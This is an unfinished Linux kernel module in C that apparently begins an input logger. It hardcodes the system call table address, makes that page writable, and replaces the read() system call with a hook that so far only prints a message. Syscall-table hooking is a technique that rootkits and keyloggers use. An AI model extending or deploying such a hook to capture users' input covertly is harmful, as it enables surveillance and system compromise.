//TODO: stop including these everywhere..
#include <linux/module.h>   // For modules
#include <linux/kernel.h>   // For KERN_INFO
#include <linux/init.h>     // For init macros
#include <linux/unistd.h>
#include <linux/moduleparam.h>
#include <linux/semaphore.h> //look at ifdef kern_2_6_24 stuff again
#include <asm/cacheflush.h>
#include <asm/tlbflush.h>
#include "logInput.h"
#include "outputDevice.h"

//TODO: Fix module license tainted stuff (check dmesg)

void **syscallTable;

asmlinkage int (*originalReadCall) (int, void*, size_t);


int setPageRW(long unsigned int _addr)
{
	return set_memory_rw(PAGE_ALIGN(_addr) - PAGE_SIZE, 1); //TODO: Do I need the page align stuff?
}

int setPageRO(long unsigned int _addr)
{
	return set_memory_ro(PAGE_ALIGN(_addr) - PAGE_SIZE, 1);
}

asmlinkage int readHook(int fd, void *buf, size_t count) 
{
	printk("in read hook\n");
	return originalReadCall(fd, buf, count);
}


int __init logInput_init(void) {
	printk(KERN_INFO "in unimplemented %s\n", __FUNCTION__);
	syscallTable = (void*)0xc15d4040; //TODO: make this found dynamically
	originalReadCall = syscallTable[__NR_read];
	setPageRW((long unsigned int) syscallTable);	
	local_flush_tlb();
	syscallTable[__NR_read] = readHook; //TODO: Does this need &?
	
	// unimplemented
//	addToOutputDevice("Logging input!");
	return 0;
}

void __exit logInput_exit(void) {
	 // unimplemented
	syscallTable[__NR_read] = originalReadCall;	
}
